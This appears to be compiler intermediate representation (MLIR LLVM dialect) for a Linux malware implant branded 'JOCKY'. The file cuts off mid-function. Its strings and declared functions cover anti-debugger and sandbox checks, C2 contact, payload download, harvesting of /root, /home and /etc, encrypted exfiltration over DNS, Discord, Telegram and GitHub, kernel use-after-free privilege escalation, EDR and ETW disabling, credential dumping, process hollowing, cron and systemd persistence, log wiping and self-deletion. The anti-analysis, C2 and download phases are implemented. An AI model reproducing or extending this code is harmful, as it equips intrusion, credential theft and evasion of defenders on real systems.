module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr<270> = dense<32> : vector<4xi64>, !llvm.ptr<271> = dense<32> : vector<4xi64>, !llvm.ptr<272> = dense<64> : vector<4xi64>, i64 = dense<64> : vector<2xi64>, f80 = dense<128> : vector<2xi64>, !llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little", "dlti.mangling_mode" = "e", "dlti.legal_int_widths" = array<i32: 8, 16, 32, 64>, "dlti.stack_alignment" = 128 : i64>, llvm.module_asm = [], llvm.target_triple = "x86_64-unknown-linux-gnu"} {
  llvm.mlir.global private constant @".str.0"("[*] Phase 1: Anti-Analysis Detection\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.1"("    [-] Debugger detected\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.2"("    [!] VM detected\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.3"("    [!] Sandbox detected\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.4"("[+] Anti-analysis complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.5"("[*] Phase 2: C2 Bootstrap\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.6"("http://localhost:8443/api/config\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.7"(dense<0> : tensor<1xi8>) {addr_space = 0 : i32, dso_local} : !llvm.array<1 x i8>
  llvm.mlir.global private constant @".str.8"("    [+] C2 communication established\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.9"("[*] Phase 3: Model Download\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.10"("http://localhost:9000/models/phi-3.gguf\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.11"("/tmp/.jocky_model\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.12"("    [+] Model download attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.13"("[*] Phase 4: Data Collection\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.14"("/root\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.15"("    [+] /root collected: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.16"(" bytes\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.17"("/home\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.18"("    [+] /home collected: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.19"("/etc\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.20"("    [+] /etc collected: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.21"("[+] Data Collection: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.22"("[*] Phase 5: Encryption & Encoding\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.23"("    [+] XOR encryption applied\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.24"("key\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.25"("    [+] RC4 encryption applied\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.26"("    [+] Data compressed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.27"("    [+] Base64 encoded: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.28"("[*] Phase 6: Exfiltration\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.29"("http://localhost:9000/upload\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.30"("Bearer_token\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.31"("POST\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.32"("    [+] CDN exfiltration attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.33"("    [+] DNS tunnel attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.34"("    [+] Discord exfiltration attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.35"("    [+] GitHub exfiltration attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.36"("JOCKY\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.37"("    [+] Telegram exfiltration attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.38"("[*] Phase 7: Kernel Exploitation\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.39"("    [+] kFence detection attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.40"("/lib/modules\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.41"("exploit\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.42"("    [+] LKM loading attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.43"("trace\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.44"("    [+] eBPF loading attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.45"("[*] Phase 8: Process Hijacking\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.46"("    [+] Ptrace attachment attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.47"("    [+] Process hollowing attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.48"("    [+] Thread hijacking attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.49"("[*] Phase 9: Module Operations\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.50"("/lib64/libc.so.6\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.51"("    [+] Module loading attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.52"("malloc\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.53"("    [+] Symbol resolution attempted\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.54"("    [+] Module base retrieved\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.55"("[*] Phase 10: Persistence & Anti-Forensics\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.56"("/usr/local/bin/jocky\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.57"("*/5 * * * *\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.58"("    [+] Cron persistence created\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.59"("jocky\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.60"("    [+] Systemd persistence created\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.61"("    [+] Bash history cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.62"("    [+] Syslog cleaned\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.63"("    [+] Journal cleaned\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.64"("    [+] Audit logs cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.65"("[*] Phase 11: Self-Deletion\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.66"("[+] Binary removed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.67"("\E2\95\94\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\97\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.68"("\E2\95\91 JOCKY Linux Production - 40+ Runtime APIs                  \E2\95\91\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.69"("\E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.70"("[*] Build: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.71"("JOCKY_LINUX_SIMPLE_V1\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.72"("[+] Execution complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.73"("[*] Data exfiltrated: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.74"("[*] Kernel access: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.75"("[*] Root achieved: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global external @C2_PRIMARY() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @CDN_ENDPOINT() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @LOCAL_MODEL_PATH() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @BUILD_ID() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @collected_data() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @root_achieved(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @kernel_access(false) {addr_space = 0 : i32} : i1
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_get_syscall_number(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_kread(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_kwrite(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_module_stomp(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_thread_hijack(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @forensics_wipe_powershell_history() -> i32
  llvm.func @forensics_wipe_cmd_history() -> i32
  llvm.func @forensics_flush_arp_cache() -> i32
  llvm.func @forensics_clear_dns_cache() -> i32
  llvm.func @linux_forensics_wipe_bash_history() -> i32
  llvm.func @jocky_linux_cleanup_syslog() -> i32
  llvm.func @jocky_linux_cleanup_journal() -> i32
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr) -> i32
  llvm.func @jocky_cleanup_usn_journal() -> i32
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @sandbox_set_limits(i32, i64, i32, i64) -> i1
  llvm.func @sandbox_monitor(i32) -> i32
  llvm.func @sandbox_wait(i32) -> i32
  llvm.func @sandbox_export_trace(i32, !llvm.ptr) -> i1
  llvm.func @jocky_registry_create_key(i32, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
  llvm.func @jocky_registry_close_key(!llvm.ptr) -> i1
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_init(i32) -> i1
  llvm.func @audit_export(!llvm.ptr) -> i1
  llvm.func @audit_verify() -> i32
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @ai_init() -> i32
  llvm.func @ai_collect_telemetry() -> !llvm.ptr
  llvm.func @ai_score_threat() -> f64
  llvm.func @byovd_load_driver(!llvm.ptr) -> i32
  llvm.func @byovd_test_exploit(i32) -> i32
  llvm.func @btr_disable_notifications() -> i1
  llvm.func @btr_mask_module(!llvm.ptr) -> i1
  llvm.func @jocky_exploit_disable_callbacks() -> i32
  llvm.func @jocky_exploit_token_replacement(i32, i32) -> i32
  llvm.func @edrhoker_detect() -> i1
  llvm.func @blindside_unhook_ntdll() -> i1
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_module_load(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_module_unload(!llvm.ptr) -> i1
  llvm.func @jocky_module_has_symbol(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_module_base(!llvm.ptr) -> i64
  llvm.func @jocky_module_resolve_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_process_hollow_linux(i32, !llvm.ptr, i64) -> i1
  llvm.func @jocky_process_ptrace_attach(i32) -> i32
  llvm.func @jocky_process_ptrace_detach(i32) -> i32
  llvm.func @jocky_process_get_maps(i32, !llvm.ptr, i64) -> i32
  llvm.func @jocky_fence2pwn_detect_kfence() -> i32
  llvm.func @jocky_fence2pwn_get_pool_info(!llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_trigger_allocations(i64, i32) -> i32
  llvm.func @jocky_fence2pwn_exploit_uaf(i32, i32, !llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_manipulate_creds(i32, i32) -> i32
  llvm.func @jocky_fence2pwn_allocate_cred_objects(i32) -> i32
  llvm.func @jocky_fence2pwn_write_cred(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_fence2pwn_trigger_reclamation() -> i32
  llvm.func @jocky_fence2pwn_elevate_to_root() -> i32
  llvm.func @jocky_fence2pwn_find_uaf_primitive() -> i32
  llvm.func @jocky_ebpf_load(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_ebpf_attach(i32, i32, i32) -> i32
  llvm.func @jocky_ebpf_run(i32, !llvm.ptr, i32) -> i64
  llvm.func @jocky_lkm_load(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_lkm_unload(!llvm.ptr) -> i32
  llvm.func @jocky_lkm_get_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_syscall_hook(i32, !llvm.ptr) -> i32
  llvm.func @jocky_syscall_unhook(i32) -> i32
  llvm.func @jocky_syscall_trace(i32) -> i32
  llvm.func @jocky_ftrace_attach(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_ftrace_detach(!llvm.ptr) -> i32
  llvm.func @jocky_http_get(!llvm.ptr, !llvm.ptr, i64) -> i64
  llvm.func @jocky_http_post(!llvm.ptr, !llvm.ptr, i32, !llvm.ptr) -> i1
  llvm.func @jocky_download_file(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_compress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_decompress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_unhook_kernel32() -> i1
  llvm.func @jocky_enable_direct_syscalls() -> i1
  llvm.func @jocky_disable_ob_callbacks() -> i1
  llvm.func @jocky_disable_minifilter_callbacks() -> i1
  llvm.func @jocky_disable_wdfilter() -> i1
  llvm.func @jocky_patch_etw_provider() -> i1
  llvm.func @jocky_spoof_process_name(!llvm.ptr) -> i1
  llvm.func @jocky_hide_from_usermode() -> i1
  llvm.func @jocky_registry_enum_keys(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_enum_values(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_get_value(i32, !llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_dump_sam() -> i32
  llvm.func @jocky_registry_dump_security() -> i32
  llvm.func @jocky_registry_dump_lsa_secrets() -> i32
  llvm.func @jocky_registry_delete_key(i32, !llvm.ptr) -> i1
  llvm.func @jocky_wipe_jumplist() -> i1
  llvm.func @jocky_wipe_thumbcache() -> i1
  llvm.func @jocky_clear_recent_files() -> i1
  llvm.func @jocky_clear_mft_timestamps() -> i1
  llvm.func @jocky_wipe_free_space() -> i1
  llvm.func @jocky_wipe_temp_files(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_cache(!llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_history(!llvm.ptr) -> i1
  llvm.func @jocky_cron_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_systemd_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_cron_remove(!llvm.ptr) -> i1
  llvm.func @jocky_systemd_remove(!llvm.ptr) -> i1
  llvm.func @jocky_linux_cleanup_audit() -> i32
  llvm.func @jocky_linux_cleanup_wtmp() -> i32
  llvm.func @jocky_linux_cleanup_lastlog() -> i32
  llvm.func @jocky_thread_get_info(i32) -> !llvm.ptr
  llvm.func @jocky_module_info(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_fence2pwn_spray() -> i1
  llvm.func @jocky_fence2pwn_trigger() -> i1
  llvm.func @jocky_fence2pwn_verify_spray() -> i1
  llvm.func @jocky_lsass_dump() -> i32
  llvm.func @jocky_credentials_enumerate() -> !llvm.ptr
  llvm.func @jocky_token_enumerate() -> !llvm.ptr
  llvm.func @jocky_impersonate_user(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_data_base64_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_base64_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_data_hex_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_hex_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @phase_anti_analysis() -> i1 {
    %0 = llvm.mlir.addressof @".str.0" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.3" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.4" : !llvm.ptr
    %5 = llvm.mlir.constant(true) : i1
    %6 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %7 = llvm.mlir.constant(false) : i1
    %8 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    %9 = llvm.call @jocky_is_debugger_present() : () -> i1
    llvm.cond_br %9, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %10 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%10) : (!llvm.ptr) -> ()
    llvm.return %7 : i1
  ^bb2:  // pred: ^bb0
    %11 = llvm.call @jocky_is_vm() : () -> i1
    llvm.cond_br %11, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %12 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    llvm.call @println(%12) : (!llvm.ptr) -> ()
    llvm.call @jocky_sleep_and_recheck() : () -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %13 = llvm.call @jocky_is_sandbox() : () -> i1
    llvm.cond_br %13, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %14 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %15 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    llvm.return %5 : i1
  }
  llvm.func @phase_c2() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.5" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %5 = llvm.mlir.constant(4096 : i32) : i32
    %6 = llvm.mlir.addressof @".str.8" : !llvm.ptr
    %7 = llvm.mlir.constant(true) : i1
    %8 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %9 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%9) : (!llvm.ptr) -> ()
    %10 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    %11 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %12 = llvm.sext %5 : i32 to i64
    %13 = llvm.call @jocky_http_get(%10, %11, %12) : (!llvm.ptr, !llvm.ptr, i64) -> i64
    llvm.store %13, %8 {alignment = 8 : i64} : i64, !llvm.ptr
    %14 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    llvm.return %7 : i1
  }
  llvm.func @phase_model() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.9" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.10" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.11" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.12" : !llvm.ptr
    %6 = llvm.mlir.constant(true) : i1
    %7 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %8 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %9 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%9) : (!llvm.ptr) -> ()
    %10 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.store %10, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %11 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %12 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %13 = llvm.call @jocky_download_file(%11, %12) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.store %13, %8 {alignment = 1 : i64} : i1, !llvm.ptr
    %14 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    llvm.return %6 : i1
  }
  llvm.func @phase_collect() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.13" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.14" : !llvm.ptr
    %4 = llvm.mlir.constant(true) : i1
    %5 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %6 = llvm.mlir.addressof @collected_data : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.16" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.17" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.19" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.20" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.21" : !llvm.ptr
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
